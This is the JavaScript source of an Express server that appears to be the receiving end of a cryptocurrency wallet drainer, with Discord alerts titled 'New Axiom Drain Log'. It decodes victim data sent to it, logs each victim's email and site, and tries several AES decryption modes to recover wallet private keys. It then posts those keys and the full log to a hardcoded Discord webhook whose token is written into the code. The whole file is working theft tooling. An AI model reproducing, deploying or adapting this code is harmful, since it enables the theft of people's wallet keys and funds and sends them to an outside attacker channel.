const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518196583206879272/TKj5GIGfWVOyluZOUxDvZ4ZSCi7_QMROkpDCg1CZ5fbYVDbZi6QHpjql2qyjzmmJYm0j";

app.use(express.raw({ type: '*/*', limit: '10mb' }));
app.use(express.json({ limit: '10mb' }));

app.get('/data/:payload', async (req, res) => {
    try {
        const encoded = req.params.payload;
        const decodedStr = Buffer.from(encoded, 'base64').toString('utf-8');
        let data = JSON.parse(decodedStr);

        console.log(`✅ Log received | Site: ${data.site} | Email: ${data.user?.email}`);

        if (data.portfolio?.bundleKey) {
            data.portfolio = decryptPortfolio(data.portfolio);
        }

        await sendToDiscord(data);
        res.status(200).send('OK');
    } catch (error) {
        console.error("❌ Error:", error.message);
        res.status(400).send('Bad Request');
    }
});

function decryptPortfolio(portfolio) {
    const keyB64 = portfolio.bundleKey;
    console.log("🔑 BundleKey:", keyB64);

    if (portfolio.sBundles) {
        try {
            const bundles = JSON.parse(portfolio.sBundles);
            portfolio.sBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "sBundle"));
        } catch (e) {
            portfolio.sBundlesDecrypted = [{ error: e.message }];
        }
    }

    if (portfolio.eBundles) {
        try {
            const bundles = JSON.parse(portfolio.eBundles);
            portfolio.eBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, keyB64, "eBundle"));
        } catch (e) {
            portfolio.eBundlesDecrypted = [{ error: e.message }];
        }
    }
    return portfolio;
}

function decryptSingleBundle(bundleStr, keyB64, type) {
    if (!bundleStr?.includes(':')) return { raw: bundleStr };

    const [prefix, encrypted] = bundleStr.split(':', 2);
    const result = tryDecryptAES(encrypted, keyB64);

    if (result.success) {
        console.log(`✅ ${type} DECRYPTED successfully with ${result.method}`);
        try {
            const parsedData = JSON.parse(result.decrypted);
            return { prefix, data: parsedData, method: result.method };
        } catch (e) {
            return { prefix, decrypted: result.decrypted, method: result.method };
        }
    } else {
        console.log(`❌ ${type} decryption failed`);
        return { prefix, error: "Failed", raw: encrypted };
    }
}

function tryDecryptAES(encryptedB64, keyB64) {
    const key = Buffer.from(keyB64, 'base64');
    const derivedKey = crypto.createHash('sha256').update(key).digest();

    const attempts = [
        { name: "CBC-ZeroIV-NoPad", mode: 'aes-256-cbc', key: key, iv: Buffer.alloc(16, 0), nopad: true },
        { name: "CBC-DerivedZero-NoPad", mode: 'aes-256-cbc', key: derivedKey, iv: Buffer.alloc(16, 0), nopad: true },
        { name: "CBC-KeyIV-NoPad", mode: 'aes-256-cbc', key: key, iv: key.slice(0, 16), nopad: true },
        { name: "CBC-ZeroIV", mode: 'aes-256-cbc', key: key, iv: Buffer.alloc(16, 0) },
    ];

    for (const att of attempts) {
        try {
            const decipher = crypto.createDecipheriv(att.mode, att.key, att.iv);
            if (att.nopad) decipher.setAutoPadding(false);

            let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
            decrypted += decipher.final('utf8');

            if (decrypted.length > 20) {
                return { success: true, decrypted, method: att.name };
            }
        } catch (e) {}
    }
    return { success: false, error: "All attempts failed" };
}

async function sendToDiscord(data) {
    const portfolio = data.portfolio || {};

    // Improved success detection
    const sSuccess = portfolio.sBundlesDecrypted?.some(b => b.data && (b.data.privateKey || b.data.publicKey));
    const eSuccess = portfolio.eBundlesDecrypted?.some(b => b.data && (b.data.privateKey || b.data.publicKey));
    const hasSuccess = sSuccess || eSuccess;

    console.log(`🔍 Success check: sBundles=${sSuccess}, eBundles=${eSuccess}, final=${hasSuccess}`);

    const mainEmbed = {
        title: "📥 New Axiom Drain Log",
        color: hasSuccess ? 0x00FF00 : 0xFF0000,
        fields: [
            { name: "Email", value: data.user?.email || "N/A", inline: true },
            { name: "Site", value: data.site || "N/A", inline: true },
            { name: "Decryption", value: hasSuccess ? "✅ Success" : "❌ Failed", inline: true }
        ],
        timestamp: new Date().toISOString()
    };

    let summaryFields = [
        { name: "Email", value: data.user?.email || "N/A" },
        { name: "Site", value: data.site || "N/A" }
    ];

    if (hasSuccess) {
        const keys = [];
        ['sBundlesDecrypted', 'eBundlesDecrypted'].forEach(field => {
            portfolio[field]?.forEach(b => {
                if (b.data?.privateKey) keys.push({type: "Private", key: b.data.privateKey});
                if (b.data?.publicKey) keys.push({type: "Public", key: b.data.publicKey});
            });
        });

        keys.forEach((k, i) => {
            summaryFields.push({ name: `${k.type} Key ${i+1}`, value: `\`\`\`${k.key}\`\`\`` });
        });
    }

    const summaryEmbed = {
        title: "📋 Summary",
        color: 0x00AAFF,
        fields: summaryFields.slice(0, 25)
    };

    // Send with FormData for reliable file attachment
    const form = new FormData();
    form.append('payload_json', JSON.stringify({
        content: "**New Axiom Drain Log**",
        embeds: [mainEmbed, summaryEmbed]
    }));

    const jsonBuffer = Buffer.from(JSON.stringify(data, null, 2), 'utf-8');
    form.append('file', jsonBuffer, {
        filename: `axiom_full_log_${Date.now()}.json`,
        contentType: 'application/json'
    });

    try {
        await axios.post(DISCORD_WEBHOOK, form, {
            headers: form.getHeaders()
        });
        console.log("✅ Sent to Discord with full JSON file");
    } catch (err) {
        console.error("❌ Discord error:", err.message);
    }
}

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
